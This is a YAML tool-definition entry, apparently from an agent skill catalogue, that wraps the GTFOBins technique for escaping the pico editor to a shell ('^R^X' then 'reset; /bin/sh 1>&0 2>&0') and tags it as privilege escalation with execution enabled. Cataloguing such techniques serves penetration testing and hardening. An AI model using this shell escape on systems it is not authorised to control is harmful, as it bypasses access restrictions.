---
id: text-editor-pico
namespace: text:editor:pico
name: pico
description: Simple text editor (Pine message composer), can spawn a shell.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
  - bsd
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - nano
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 4
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 4
  network: none
  disk_io: low
allowed-tools:
  - pico
  - nano
  - Bash
  - execFile
parameters: []
features:
  - interactive
  - process-manip
execution:
  template: "pico /path/to/file"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via pico
    command: |
      pico /path/to/file
      ^R^X
      reset; /bin/sh 1>&0 2>&0
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/pico/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "pico"
    commands:
      - "apt-get install -y pico"
---
